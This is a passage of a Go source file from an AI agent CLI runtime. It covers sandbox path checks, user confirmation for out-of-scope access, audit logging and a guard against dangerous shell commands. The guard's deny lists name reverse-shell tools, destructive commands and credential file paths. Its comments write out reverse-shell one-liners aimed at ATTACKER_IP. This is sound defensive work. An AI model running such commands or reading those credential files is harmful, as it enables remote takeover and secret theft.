package runtime

import (
	"bufio"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	internalconfig "snz1.cn/gitrepo/dp/ai/taiyi/taiyiflow-cli/internal/config"
	"snz1.cn/gitrepo/dp/ai/taiyi/taiyiflow-cli/internal/skills"
)

type sandboxEscapeError struct {
	ResolvedPath string
}

func (e sandboxEscapeError) Error() string {
	return fmt.Sprintf("路径超出当前工作目录访问范围: %s", e.ResolvedPath)
}

func isSandboxEscapeError(err error) (sandboxEscapeError, bool) {
	var target sandboxEscapeError
	if errors.As(err, &target) {
		return target, true
	}
	return sandboxEscapeError{}, false
}

func (r *ClientRuntime) resolveAllowedDirectoryWithPolicy(config internalconfig.Config, requested string) (string, error) {
	resolved, err := r.resolveAllowedPathWithPolicy(config, requested, false)
	if err == nil {
		info, statErr := os.Stat(resolved)
		if statErr == nil {
			if info.IsDir() {
				return resolved, nil
			}
			return "", newToolError("PARAM_ERROR", "“%s”是一个文件", resolved)
		}
	}
	if fallback, ok := resolveSkillScopedPath(config, requested, true, false); ok {
		resolvedFallback, fallbackErr := r.resolveAllowedPathWithPolicy(config, fallback, false)
		if fallbackErr == nil {
			info, statErr := os.Stat(resolvedFallback)
			if statErr == nil {
				if info.IsDir() {
					return resolvedFallback, nil
				}
				return "", newToolError("PARAM_ERROR", "“%s”是一个文件", resolvedFallback)
			}
		}
	}
	if err != nil {
		return "", err
	}
	return "", newToolError("EXECUTION_FAILED", "“%s”目录不存在", resolved)
}

func (r *ClientRuntime) resolveAllowedFilePathWithPolicy(config internalconfig.Config, requested string, allowCreate bool) (string, error) {
	resolved, err := r.resolveAllowedPathWithPolicy(config, requested, allowCreate)
	if err == nil {
		if allowCreate {
			return resolved, nil
		}
		info, statErr := os.Stat(resolved)
		if statErr == nil {
			if info.IsDir() {
				return "", newToolError("PARAM_ERROR", "“%s”是一个目录", resolved)
			}
			return resolved, nil
		}
	}
	if fallback, ok := resolveSkillScopedPath(config, requested, false, allowCreate); ok {
		resolvedFallback, fallbackErr := r.resolveAllowedPathWithPolicy(config, fallback, allowCreate)
		if fallbackErr == nil {
			if allowCreate {
				return resolvedFallback, nil
			}
			info, statErr := os.Stat(resolvedFallback)
			if statErr == nil {
				if info.IsDir() {
					return "", newToolError("PARAM_ERROR", "“%s”是一个目录", resolvedFallback)
				}
				return resolvedFallback, nil
			}
		}
	}
	if err != nil {
		return "", err
	}
	if allowCreate {
		return resolved, nil
	}
	return "", newToolError("EXECUTION_FAILED", "“%s”文件不存在", resolved)
}

func (r *ClientRuntime) resolveAllowedPathWithPolicy(config internalconfig.Config, requested string, allowCreate bool) (string, error) {
	resolved, err := resolveAllowedPath(config, requested, allowCreate)
	if err != nil {
		escapeErr, ok := isSandboxEscapeError(err)
		if !ok {
			return "", err
		}
		effectivePolicy := strings.TrimSpace(config.SandboxEscapePolicy)
		if override := strings.TrimSpace(r.sandboxEscapePolicyOverride); override != "" {
			effectivePolicy = internalconfig.NormalizeSandboxEscapePolicy(override)
		}
		switch internalconfig.NormalizeSandboxEscapePolicy(effectivePolicy) {
		case internalconfig.SandboxEscapePolicyAllow:
			bypassConfig := config
			bypassConfig.SandboxEscapePolicy = internalconfig.SandboxEscapePolicyAllow
			resolved, err = resolveAllowedPath(bypassConfig, requested, allowCreate)
			if err != nil {
				return "", err
			}
		case internalconfig.SandboxEscapePolicyDeny:
			return "", newToolError("PERMISSION_DENIED", "“%s”超出当前工作目录访问范围，已按策略拒绝访问", escapeErr.ResolvedPath)
		default:
			approved, interactive, confirmErr := r.confirmSandboxEscapePath(escapeErr.ResolvedPath)
			if confirmErr != nil {
				return "", confirmErr
			}
			if !approved {
				if !interactive {
					return "", newToolError("PERMISSION_DENIED", "“%s”超出当前工作目录访问范围，请使用--allow参数允许访问", escapeErr.ResolvedPath)
				}
				return "", newToolError("PERMISSION_DENIED", "“%s”超出当前工作目录访问范围，用户拒绝访问", escapeErr.ResolvedPath)
			}
			bypassConfig := config
			bypassConfig.SandboxEscapePolicy = internalconfig.SandboxEscapePolicyAllow
			resolved, err = resolveAllowedPath(bypassConfig, requested, allowCreate)
			if err != nil {
				return "", err
			}
		}
	}
	return resolved, nil
}

// readStdinWithTimeout 从 stdin 读取一行，超时后返回空字符串和 nil error。
// timeoutSeconds <= 0 表示不启用超时。
func (r *ClientRuntime) readStdinWithTimeout(timeoutSeconds int) (string, error) {
	if timeoutSeconds <= 0 {
		reader := bufio.NewReader(r.stdin)
		line, err := reader.ReadString('\n')
		return line, err
	}
	type readResult struct {
		line string
		err  error
	}
	ch := make(chan readResult, 1)
	go func() {
		reader := bufio.NewReader(r.stdin)
		line, err := reader.ReadString('\n')
		ch <- readResult{line: line, err: err}
	}()
	select {
	case res := <-ch:
		return res.line, res.err
	case <-time.After(time.Duration(timeoutSeconds) * time.Second):
		fmt.Fprintf(r.stdout, "\n⏱ 等待用户确认超时（%d 秒），已自动拒绝。\n", timeoutSeconds)
		return "", nil
	}
}

func (r *ClientRuntime) confirmSandboxEscapePath(path string) (bool, bool, error) {
	if !r.interactivePromptsEnabled {
		return false, false, nil
	}
	if r.sandboxEscapeConfirmer != nil {
		approved, err := r.sandboxEscapeConfirmer(path)
		if err != nil {
			return false, true, err
		}
		return approved, true, nil
	}
	fmt.Fprintf(r.stdout, "\n[路径越界确认]\n目标路径位于当前工作目录外: %s\n是否允许本次访问？[y/N]: ", path)
	answerLine, err := r.readStdinWithTimeout(r.toolConfirmTimeoutSeconds)
	if err != nil {
		if errors.Is(err, io.EOF) {
			answer := strings.TrimSpace(strings.ToLower(answerLine))
			if answer == "y" || answer == "yes" {
				return true, false, nil
			}
			return false, false, nil
		}
		return false, true, fmt.Errorf("读取路径确认输入失败: %w", err)
	}
	answer := strings.TrimSpace(strings.ToLower(answerLine))
	return answer == "y" || answer == "yes", true, nil
}

func resolveAllowedPath(config internalconfig.Config, requested string, allowCreate bool) (string, error) {
	baseDir, err := resolveBaseDirectory(config.Workdir, "")
	if err != nil {
		return "", newToolError("EXECUTION_FAILED", "%v", err)
	}
	baseDir, err = resolveWithExistingParent(baseDir)
	if err != nil {
		return "", newToolError("PARAM_ERROR", "解析工作目录失败: %v", err)
	}
	target := strings.TrimSpace(requested)
	if target == "" {
		target = baseDir
	} else {
		expanded, err := expandTildePath(target)
		if err != nil {
			return "", newToolError("PARAM_ERROR", "“%s”解析路径失败: %v", target, err)
		}
		target = expanded
	}
	if !filepath.IsAbs(target) {
		target = filepath.Join(baseDir, target)
	}
	resolved, err := filepath.Abs(target)
	if err != nil {
		return "", newToolError("PARAM_ERROR", "“%s”解析路径失败: %v", target, err)
	}
	resolved, err = resolveWithExistingParent(resolved)
	if err != nil {
		return "", newToolError("PARAM_ERROR", "“%s”解析路径失败: %v", target, err)
	}
	if isSensitivePath(resolved) {
		return "", newToolError("PERMISSION_DENIED", "“%s”属于受保护目录", resolved)
	}
	allowedRoots, err := resolveSandboxRoots(config, baseDir)
	if err != nil {
		return "", err
	}
	for _, root := range allowedRoots {
		if isWithinRoot(resolved, root) {
			if allowCreate {
				parent := filepath.Dir(resolved)
				if !isWithinRoot(parent, root) {
					break
				}
			}
			return resolved, nil
		}
	}
	if internalconfig.NormalizeSandboxEscapePolicy(config.SandboxEscapePolicy) == internalconfig.SandboxEscapePolicyAllow {
		return resolved, nil
	}
	return "", sandboxEscapeError{ResolvedPath: resolved}
}

func resolveSandboxRoots(config internalconfig.Config, baseDir string) ([]string, error) {
	roots := []string{}
	seen := map[string]struct{}{}
	appendRoot := func(root string) error {
		trimmed := strings.TrimSpace(root)
		if trimmed == "" {
			return nil
		}
		expanded, err := expandTildePath(trimmed)
		if err != nil {
			return newToolError("PARAM_ERROR", "解析可访问外部资源目录失败: %v", err)
		}
		if !filepath.IsAbs(expanded) {
			expanded = filepath.Join(baseDir, expanded)
		}
		resolved, err := filepath.Abs(expanded)
		if err != nil {
			return newToolError("PARAM_ERROR", "解析可访问外部资源目录失败: %v", err)
		}
		resolved, err = resolveWithExistingParent(resolved)
		if err != nil {
			return newToolError("PARAM_ERROR", "解析可访问外部资源目录路径失败: %v", err)
		}
		if _, ok := seen[resolved]; ok {
			return nil
		}
		seen[resolved] = struct{}{}
		roots = append(roots, resolved)
		return nil
	}
	if err := appendRoot(baseDir); err != nil {
		return nil, err
	}
	for _, item := range config.SandboxRoots {
		if err := appendRoot(item); err != nil {
			return nil, err
		}
	}
	if items, _, err := skills.Discover(config); err == nil {
		for _, item := range items {
			if err := appendRoot(strings.TrimSpace(item.RootDir)); err != nil {
				return nil, err
			}
			if err := appendRoot(skillDirectory(item)); err != nil {
				return nil, err
			}
		}
	}
	// 始终允许访问系统临时目录，无需审核。
	// os.TempDir() 跨平台返回系统临时目录：
	//   macOS: $TMPDIR（通常 /var/folders/...），回退 /tmp
	//   Linux: /tmp
	//   Windows: %TEMP%（通常 C:\Users\<user>\AppData\Local\Temp）
	if tempDir := strings.TrimSpace(os.TempDir()); tempDir != "" {
		if err := appendRoot(tempDir); err != nil {
			return nil, err
		}
	}
	// 始终允许访问 CLI 根目录（~/.snz1dp 或 $SNZ1DP_HOME），无需审核。
	// 该目录包含技能包、内置技能、配置文件、审计日志、浏览器/桌面截图等子目录，
	// 均为 CLI 自身产物，不涉及用户工作区数据。
	if rootDir, err := internalconfig.DefaultRootDir(); err == nil {
		if err := appendRoot(rootDir); err != nil {
			return nil, err
		}
	}
	return roots, nil
}

func resolveSkillScopedPath(config internalconfig.Config, requested string, wantDirectory bool, allowCreate bool) (string, bool) {
	trimmed := strings.TrimSpace(requested)
	if trimmed == "" {
		return "", false
	}
	expanded, err := expandTildePath(trimmed)
	if err != nil || filepath.IsAbs(expanded) {
		return "", false
	}
	items, _, err := skills.Discover(config)
	if err != nil || len(items) == 0 {
		return "", false
	}
	requestedPath := filepath.ToSlash(expanded)
	segments := strings.Split(requestedPath, "/")
	seen := map[string]struct{}{}
	matches := []string{}
	for _, item := range items {
		skillDir := skillDirectory(item)
		if skillDir == "" {
			continue
		}
		for _, candidate := range skillPathCandidates(item, skillDir, requestedPath, segments) {
			candidate = filepath.Clean(candidate)
			if _, ok := seen[candidate]; ok {
				continue
			}
			seen[candidate] = struct{}{}
			if skillPathCandidateMatches(candidate, wantDirectory, allowCreate) {
				matches = append(matches, candidate)
			}
		}
	}
	if len(matches) != 1 {
		return "", false
	}
	return matches[0], true
}

func skillPathCandidates(item skills.Skill, skillDir string, requestedPath string, segments []string) []string {
	candidates := []string{filepath.Join(skillDir, filepath.FromSlash(requestedPath))}
	if rest, ok := stripSkillAliasFromPath(item, segments); ok {
		candidate := skillDir
		if rest != "" {
			candidate = filepath.Join(skillDir, filepath.FromSlash(rest))
		}
		candidates = append(candidates, candidate)
	}
	return candidates
}

func stripSkillAliasFromPath(item skills.Skill, segments []string) (string, bool) {
	if len(segments) == 0 {
		return "", false
	}
	first := strings.TrimSpace(segments[0])
	if first == "" {
		return "", false
	}
	for _, alias := range skillAliases(item) {
		if strings.EqualFold(alias, first) {
			return strings.Join(segments[1:], "/"), true
		}
	}
	return "", false
}

func skillAliases(item skills.Skill) []string {
	values := []string{}
	seen := map[string]struct{}{}
	for _, candidate := range []string{
		strings.TrimSpace(item.Name),
		filepath.Base(strings.TrimSpace(item.RelativeDir)),
		filepath.Base(filepath.Dir(strings.TrimSpace(item.Path))),
	} {
		trimmed := strings.TrimSpace(candidate)
		if trimmed == "" || trimmed == "." || strings.Contains(trimmed, "/") || strings.Contains(trimmed, `\\`) {
			continue
		}
		key := strings.ToLower(trimmed)
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		values = append(values, trimmed)
	}
	return values
}

func skillDirectory(item skills.Skill) string {
	if path := strings.TrimSpace(item.Path); path != "" {
		return filepath.Clean(filepath.Dir(path))
	}
	rootDir := strings.TrimSpace(item.RootDir)
	relativeDir := strings.TrimSpace(item.RelativeDir)
	if rootDir != "" && relativeDir != "" {
		return filepath.Clean(filepath.Join(rootDir, filepath.FromSlash(relativeDir)))
	}
	if rootDir != "" {
		return filepath.Clean(rootDir)
	}
	return ""
}

func skillPathCandidateMatches(candidate string, wantDirectory bool, allowCreate bool) bool {
	if allowCreate {
		parent := candidate
		if !wantDirectory {
			parent = filepath.Dir(candidate)
		}
		_, err := resolveWithExistingParent(parent)
		return err == nil
	}
	info, err := os.Stat(candidate)
	if err != nil {
		return false
	}
	if wantDirectory {
		return info.IsDir()
	}
	return !info.IsDir()
}

func expandTildePath(path string) (string, error) {
	trimmed := strings.TrimSpace(path)
	if trimmed == "" || trimmed[0] != '~' {
		return trimmed, nil
	}
	if trimmed != "~" && !strings.HasPrefix(trimmed, "~/") && !strings.HasPrefix(trimmed, "~\\") {
		return trimmed, nil
	}
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	if trimmed == "~" {
		return homeDir, nil
	}
	relative := strings.TrimPrefix(strings.TrimPrefix(trimmed[1:], "/"), `\`)
	if relative == "" {
		return homeDir, nil
	}
	parts := strings.FieldsFunc(relative, func(r rune) bool {
		return r == '/' || r == '\\'
	})
	return filepath.Join(append([]string{homeDir}, parts...)...), nil
}

func resolveWithExistingParent(target string) (string, error) {
	current := target
	missing := []string{}
	for {
		if _, err := os.Lstat(current); err == nil {
			resolved, err := filepath.EvalSymlinks(current)
			if err != nil {
				return "", err
			}
			for index := len(missing) - 1; index >= 0; index-- {
				resolved = filepath.Join(resolved, missing[index])
			}
			return resolved, nil
		}
		parent := filepath.Dir(current)
		if parent == current {
			break
		}
		missing = append(missing, filepath.Base(current))
		current = parent
	}
	return target, nil
}

func isWithinRoot(target string, root string) bool {
	relative, err := filepath.Rel(root, target)
	if err != nil {
		return false
	}
	if relative == "." {
		return true
	}
	return !strings.HasPrefix(relative, "..") && relative != ".."
}

func isSensitivePath(target string) bool {
	// 解析符号链接，确保 /private/etc/* 等链接路径也能被拦截。
	cleanTarget, err := filepath.EvalSymlinks(target)
	if err != nil {
		cleanTarget = target
	}
	for _, item := range sensitivePaths() {
		if isWithinRoot(cleanTarget, item) || cleanTarget == item {
			return true
		}
	}
	return false
}

func appendAuditLog(config internalconfig.Config, action string, payload map[string]any) error {
	if !config.AuditEnabled {
		return nil
	}
	auditPath, err := internalconfig.DefaultAuditLogPath()
	if err != nil {
		return err
	}
	if err := os.MkdirAll(filepath.Dir(auditPath), 0o755); err != nil {
		return err
	}
	record := map[string]any{
		"timestamp": time.Now().Format(time.RFC3339),
		"action":    action,
		"payload":   payload,
	}
	encoded, err := json.Marshal(record)
	if err != nil {
		return err
	}
	file, err := os.OpenFile(auditPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = file.WriteString(string(encoded) + "\n")
	return err
}

func sanitizeEnvOverrides(overrides map[string]string) map[string]string {
	result := map[string]string{}
	for key, value := range overrides {
		if strings.TrimSpace(key) == "" {
			continue
		}
		result[key] = value
	}
	return result
}

func isSensitiveEnvKey(key string) bool {
	upper := strings.ToUpper(strings.TrimSpace(key))
	if upper == "PATH" || strings.HasSuffix(upper, "PATH") {
		return false
	}
	keywords := []string{"API_KEY", "TOKEN", "SECRET", "PASSWORD", "PRIVATE_KEY", "ACCESS_KEY", "SESSION_KEY"}
	for _, keyword := range keywords {
		if strings.Contains(upper, keyword) {
			return true
		}
	}
	return false
}

func guardDangerousCommand(payload commandArguments, config internalconfig.Config) error {
	// deny 立即拒绝；allow 仅跳过审批确认（runCommand 层），不在守卫内短路——
	// 高危命令守卫在 auto 模式下仍需生效（对齐 Electron 端 handler 硬检查语义）。
	if action, matched := evaluatePermissionAction(config, "shell_exec", payload.RawCommand+" "+payload.Command+" "+strings.Join(payload.Args, " ")); matched {
		if action == "deny" {
			return newToolError("PERMISSION_DENIED", "命中权限规则，拒绝执行")
		}
	}
	preview := strings.ToLower(strings.TrimSpace(payload.RawCommand + " " + payload.Command + " " + strings.Join(payload.Args, " ")))
	highRiskPatterns := []string{
		"rm -rf /", "mkfs", "shutdown", "reboot", "dd if=", "killall", "sudo ",
		// Fork bomb 变体
		":(){",                // bash 经典写法 :(){ :|:& };:
		":|:&",                // bash fork bomb 管道递归片段（无空格变体）
		": () {",              // bash fork bomb 带空格变体 : () { : | : & } ; :
		"fork while fork",     // perl fork bomb
		"os.fork()",           // python fork bomb
		"while true: os.fork", // python fork bomb 显式循环
	}
	for _, pattern := range highRiskPatterns {
		if strings.Contains(preview, pattern) && strings.TrimSpace(config.ApprovalMode) == "auto" {
			return newToolError("PERMISSION_DENIED", "检测到高风险命令，请切换到允许模式后再执行")
		}
	}
	// 反向 Shell 探测拦截：检测通过 shell 命令建立反向连接的行为。
	if strings.TrimSpace(config.ApprovalMode) == "auto" {
		if err := guardReverseShell(payload, preview); err != nil {
			return err
		}
	}
	// 敏感文件访问拦截：检测通过 shell 命令读取系统密码文件、
	// SSH 密钥、云平台凭证等敏感路径的行为。
	if strings.TrimSpace(config.ApprovalMode) == "auto" {
		if err := guardSensitiveFileAccess(payload, preview); err != nil {
			return err
		}
	}
	// 符号链接逃逸拦截：检测通过 ln -s 创建指向敏感路径的符号链接。
	if strings.TrimSpace(config.ApprovalMode) == "auto" {
		if err := guardSymlinkEscape(payload, preview); err != nil {
			return err
		}
	}
	// 脚本语言敏感文件访问拦截：检测通过 python/perl/ruby 等脚本语言读取敏感文件。
	if strings.TrimSpace(config.ApprovalMode) == "auto" {
		if err := guardScriptSensitiveAccess(payload, preview); err != nil {
			return err
		}
	}
	// Base64 编码绕过拦截：检测通过 base64 编码/解码访问敏感文件。
	if strings.TrimSpace(config.ApprovalMode) == "auto" {
		if err := guardBase64Bypass(payload, preview); err != nil {
			return err
		}
	}
	// 网络下载拦截：沙盒模式下不允许下载外部文件。
	if strings.TrimSpace(config.ApprovalMode) == "auto" {
		if err := guardNetworkDownload(payload, preview, config); err != nil {
			return err
		}
	}
	// 不可逆破坏性操作拦截（L3-13 ~ L3-25）：删除敏感文件、递归删除目录、
	// 修改权限/所有者、覆盖系统文件、磁盘覆写、终止关键进程、清空文件内容、
	// 安全擦除、卸载文件系统和关机/重启。同时覆盖 Python 等脚本内嵌的同类操作。
	if strings.TrimSpace(config.ApprovalMode) == "auto" {
		if err := guardDestructiveActions(payload, preview); err != nil {
			return err
		}
	}
	// Windows 平台破坏性操作拦截：CMD 命令（del, format, reg delete, sc delete,
	// bcdedit, vssadmin, diskpart 等）和 PowerShell Cmdlet（Remove-Item,
	// Format-Volume, Stop-Computer 等）。
	if strings.TrimSpace(config.ApprovalMode) == "auto" {
		if err := guardWindowsDestructiveActions(payload, preview); err != nil {
			return err
		}
	}
	return nil
}

// guardReverseShell 检测 shell 命令中是否包含反向 Shell（reverse shell）探测行为。
// 反向 Shell 是攻击者从目标机器主动连接到外部监听端口，将 stdin/stdout/stderr
// 重定向到网络连接，从而获得交互式 Shell 的技术。
// 该检测在 auto 审批模式下生效，覆盖以下常见变体：
//   - Bash /dev/tcp 反向 Shell
//   - nc / ncat -e 或 -c 反向 Shell
//   - Python socket 反向 Shell
//   - Perl socket 反向 Shell
//   - Ruby socket 反向 Shell
//   - PHP socket 反向 Shell
//   - Socat 双向管道反向 Shell
//   - PowerShell 反向 Shell
func guardReverseShell(payload commandArguments, preview string) error {
	reverseShellPatterns := []string{
		// Bash /dev/tcp 反向 Shell
		// 经典写法: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
		"/dev/tcp/",
		"/dev/udp/",
		"bash -i >&",
		"sh -i >&",
		// nc / ncat 反向 Shell
		// nc -e /bin/sh ATTACKER_IP PORT
		// ncat -e /bin/sh ATTACKER_IP PORT
		"nc -e ",
		"ncat -e ",
		"nc -c ",
		"ncat -c ",
		// Python socket 反向 Shell
		// python -c 'import socket,subprocess,os;os.dup2(...)...'
		"import socket,subprocess,os",
		"socket.socket(socket.af_inet",
		"socket.socket(socket",
		"os.dup2(",
		// Perl socket 反向 Shell
		// perl -e 'use Socket; ...'
		"use socket;",
		"socket(socket_pf_inet",
		// Ruby socket 反向 Shell
		// ruby -rsocket -e '...'
		"ruby -rsocket",
		"-rsocket",
		"tcpsocket.open",
		"tcpsocket.new",
		// PHP socket 反向 Shell
		// php -r '$sock=fsockopen(...)...'
		"fsockopen(",
		"socket_create(",
		// Socat 反向 Shell
		// socat tcp-connect:ATTACKER_IP:PORT exec:...
		"socat tcp",
		"socat exec",
		"exec:sh,pty",
		// PowerShell 反向 Shell
		// powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(...)"
		"new-object system.net.sockets.tcpclient",
		"system.net.sockets.tcpclient",
		"invoke-tcpclient",
		// 通用反向 Shell 特征：文件描述符重定向组合
		// 仅拦截 0>&1（stdin→stdout），这是反向 Shell 最典型的特征
		"0>&1",
		// mkfifo + nc 组合
		"mkfifo /tmp/",
		// Telnet 反向 Shell
		"telnet ",
	}
	for _, pattern := range reverseShellPatterns {
		if strings.Contains(preview, pattern) {
			return newToolError("PERMISSION_DENIED", "检测到反向 Shell 探测行为（%s），请切换到允许模式后再执行", pattern)
		}
	}
	return nil
}

// guardSensitiveFileAccess 检测 shell 命令中是否包含对敏感文件路径的访问。
// 敏感路径包括：系统密码文件（/etc/passwd、/etc/shadow）、SSH 密钥目录、
// 云平台凭证目录（.aws、.kube、.docker 等）、Git/包管理器凭证文件等。
// 该检测在 auto 审批模式下生效，拦截通过 cat/less/head/tail/xxd/strings/cp
// 等命令读取或复制敏感文件的行为。
func guardSensitiveFileAccess(payload commandArguments, preview string) error {
	// 读取类命令关键词，这些命令如果出现在 shell 命令中且参数包含敏感路径则拦截。
	// 使用子串匹配而非精确分词，因为命令可能通过管道组合。
	readCommands := []string{
		"cat ", "less ", "more ", "head ", "tail ", "vi ", "vim ", "nano ",
		"xxd ", "hexdump ", "od ", "strings ", "cp ", "mv ", "scp ", "rsync ",
		"base64 ", "tee ", "dd ", "grep ", "awk ", "sed ", "ls ",
		"type ", // Windows CMD type 命令（等同于 cat）
	}
	// 敏感路径片段（小写匹配），覆盖系统密码文件和用户隐私/密钥目录。
	sensitivePathFragments := sensitivePathFragmentsForGuard()
	// 检查命令预览中是否同时包含读取类命令和敏感路径片段。
	hasReadCommand := false
	for _, cmd := range readCommands {
		if strings.Contains(preview, cmd) {
			hasReadCommand = true
			break
		}
	}
	if !hasReadCommand {
		return nil
	}
	for _, fragment := range sensitivePathFragments {
		if strings.Contains(preview, fragment) {
			return newToolError("PERMISSION_DENIED", "检测到敏感文件访问（%s），请切换到允许模式后再执行", fragment)
		}
	}
	return nil
}

// sensitivePathFragmentsForGuard 返回敏感路径片段列表，供各 guard 函数复用。
// 包含正斜杠（Unix/macOS）和反斜杠（Windows）两种变体，确保跨平台匹配。
func sensitivePathFragmentsForGuard() []string {
	return []string{
		// 系统密码文件（Unix/macOS）
		"/etc/passwd", "/etc/shadow", "/etc/gshadow", "/etc/sudoers",
		"/etc/master.passwd",
		// SSH 密钥与配置（正斜杠 + 反斜杠变体）
		".ssh/", ".ssh\\",
		"id_rsa", "id_ecdsa", "id_ed25519", "id_dsa",
		"authorized_keys", "known_hosts",
		// GPG 密钥（正斜杠 + 反斜杠变体）
		".gnupg/", ".gnupg\\",
		// 云平台凭证（正斜杠 + 反斜杠变体）
		".aws/", ".aws\\",
		".kube/", ".kube\\",
		".docker/", ".docker\\",
		".config/gcloud/", ".config\\gcloud\\",
		".azure/", ".azure\\",
		".config/azure/", ".config\\azure\\",
		// Git 与包管理器凭证
		".git-credentials", ".netrc", ".npmrc", ".pypirc",
		// macOS 钥匙串
		"library/keychains",
		// Windows 系统关键文件
		"system32\\config\\sam", "system32\\config\\system", "system32\\config\\security",
		"system32\\drivers\\etc\\hosts",
		// Windows 凭证目录
		"microsoft\\credentials",
		// Shell 配置文件（可能含 API Key、TOKEN 等环境变量）
		".zshrc", ".bashrc", ".bash_profile", ".zprofile", ".profile", ".env",
		".gitconfig",
		// Shell 历史记录（证据文件）
		"psreadline", "consolehost_history.txt",
		// 基础设施即代码与 PKI 凭据
		"/.gem/", "/.terraform.d", "/.ansible", ".vault-token", "/.pki/",
		".local/share/keyring", ".local\\share\\keyring",
		".config/oci/", ".config\\oci\\",
		// 浏览器密码库
		"/.mozilla", "/.thunderbird", ".config/google-chrome/", ".config/chromium/",
		"library/application support/google/chrome",
		"library/application support/chromium",
		"library/application support/firefox",
		// 系统关键文件补充
		"/etc/hosts", "/etc/fstab", "/etc/ssh", "/etc/ssl/private",
		"/etc/letsencrypt", "/etc/passwd-", "/etc/shadow-", "/etc/gshadow-",
		// Windows 补充
		"system32\\config\\software", "system32\\config\\default",
		"system32\\winevt", "microsoft\\crypto", "microsoft\\protect",
	}
}

// guardSymlinkEscape 检测通过 ln -s 创建指向敏感路径的符号链接。
// 攻击者可在工作目录内创建指向 /etc/passwd、~/.ssh/id_rsa 等敏感文件的符号链接，
// 然后通过正常文件读取工具间接访问敏感内容，绕过路径检查。
// 检测模式：ln -s <敏感路径> <目标> 或 ln -sf <敏感路径> <目标>
func guardSymlinkEscape(payload commandArguments, preview string) error {
	lnPatterns := []string{"ln -s ", "ln -sf "}
	hasLn := false
	for _, p := range lnPatterns {
		if strings.Contains(preview, p) {
			hasLn = true
			break
		}
	}
	if !hasLn {
		return nil
	}
	for _, fragment := range sensitivePathFragmentsForGuard() {
		if strings.Contains(preview, fragment) {
			return newToolError("PERMISSION_DENIED", "检测到符号链接指向敏感路径（%s），请切换到允许模式后再执行", fragment)
		}
	}
	return nil
}

// guardScriptSensitiveAccess 检测通过脚本语言（Python/Perl/Ruby/PHP/Node.js）
// 读取或复制敏感文件的行为。攻击者可绕过 cat/cp 等命令级拦截，
// 使用 python -c 'open("/etc/passwd").read()' 等方式读取敏感文件。
func guardScriptSensitiveAccess(payload commandArguments, preview string) error {
	// 脚本语言执行关键词
	scriptIndicators := []string{
		"python ", "python3 ", "python2 ",
		"perl ", "perl -e",
		"ruby ", "ruby -e",
		"php ", "php -r",
		"node ", "node -e",
		"powershell ", "powershell.exe ",
		"pwsh ", "pwsh.exe ",
	}
	hasScript := false
	for _, s := range scriptIndicators {
		if strings.Contains(preview, s) {
			hasScript = true
			break
		}
	}
	if !hasScript {
		return nil
	}
	// 脚本语言中常见的文件操作模式
	fileAccessPatterns := []string{
		"open(", "open (", // Python open()
		"io.read",                    // Python io.read()
		"fileinput",                  // Python fileinput
		"shutil.copy", "shutil.move", // Python shutil
		"os.path.join",                     // Python os.path
		"subprocess",                       // Python subprocess
		"open(my $fh",                      // Perl open
		"open(file",                        // Perl/PHP open
		"file.open",                        // Ruby File.open
		"file.read",                        // Ruby File.read
		"require('fs')", "require(\"fs\")", // Node.js fs
		"readfilesync",      // Node.js readFileSync
		"createReadStream",  // Node.js createReadStream
		"file_get_contents", // PHP file_get_contents
		"fopen(",            // PHP/C fopen
		"get-content",       // PowerShell Get-Content
		"get-item",          // PowerShell Get-Item
		"copy-item",         // PowerShell Copy-Item
		"import-csv",        // PowerShell Import-Csv
	}
	hasFileAccess := false
	for _, p := range fileAccessPatterns {
		if strings.Contains(preview, p) {
			hasFileAccess = true
			break
		}
	}
	if !hasFileAccess {
		return nil
	}
	for _, fragment := range sensitivePathFragmentsForGuard() {
		if strings.Contains(preview, fragment) {
			return newToolError("PERMISSION_DENIED", "检测到脚本语言访问敏感文件（%s），请切换到允许模式后再执行", fragment)
		}
	}
	return nil
}

// guardBase64Bypass 检测通过 base64 编码/解码绕过敏感文件访问防护的行为。
// 攻击者可使用 base64 /etc/passwd 或 cat /etc/passwd | base64 等方式
// 将敏感文件内容编码后输出，试图绕过基于命令名的检测。
func guardBase64Bypass(payload commandArguments, preview string) error {
	// base64 命令直接跟文件路径
	if strings.Contains(preview, "base64 ") {
		for _, fragment := range sensitivePathFragmentsForGuard() {
			if strings.Contains(preview, fragment) {
				return newToolError("PERMISSION_DENIED", "检测到通过 base64 编码访问敏感文件（%s），请切换到允许模式后再执行", fragment)
			}
		}
	}
	// 管道组合：敏感文件 | base64 或 cat 敏感文件 | base64
	pipeBase64Patterns := []string{
		"| base64", "| base64 ", "| b64encode", "| b64decode",
		"| openssl base64", "| openssl enc -base64",
	}
	for _, p := range pipeBase64Patterns {
		if strings.Contains(preview, p) {
			for _, fragment := range sensitivePathFragmentsForGuard() {
				if strings.Contains(preview, fragment) {
					return newToolError("PERMISSION_DENIED", "检测到通过管道 base64 编码访问敏感文件（%s），请切换到允许模式后再执行", fragment)
				}
			}
		}
	}
	// xxd/hexdump 编码绕过
	encodeCmds := []string{"| xxd", "| hexdump", "| od "}
	for _, p := range encodeCmds {
		if strings.Contains(preview, p) {
			for _, fragment := range sensitivePathFragmentsForGuard() {
				if strings.Contains(preview, fragment) {
					return newToolError("PERMISSION_DENIED", "检测到通过编码绕过访问敏感文件（%s），请切换到允许模式后再执行", fragment)
				}
			}
		}
	}
	return nil
}

// guardNetworkDownload 在沙盒模式下拦截下载外部文件的行为。
// 当 ShellSandboxMode 不为 off 时，不允许通过 curl/wget/ftp/scp/rsync 等
// 命令从外部下载文件到本地。
func guardNetworkDownload(payload commandArguments, preview string, config internalconfig.Config) error {
	// 仅在沙盒模式开启时拦截
	sandboxMode := internalconfig.NormalizeShellSandboxMode(config.ShellSandboxMode)
	if sandboxMode == internalconfig.ShellSandboxModeOff {
		return nil
	}
	// 网络下载命令模式
	downloadPatterns := []string{
		"curl -o ", "curl -o\t", "curl --output",
		"wget ", "wget -o", "wget -o ",
		"scp ", // 远程复制到本地
		"rsync -r ", "rsync -a ",
		"ftp ", "sftp ",
		"fetch ",  // FreeBSD fetch
		"aria2c ", // aria2 下载工具
		"axel ",   // axel 多线程下载
	}
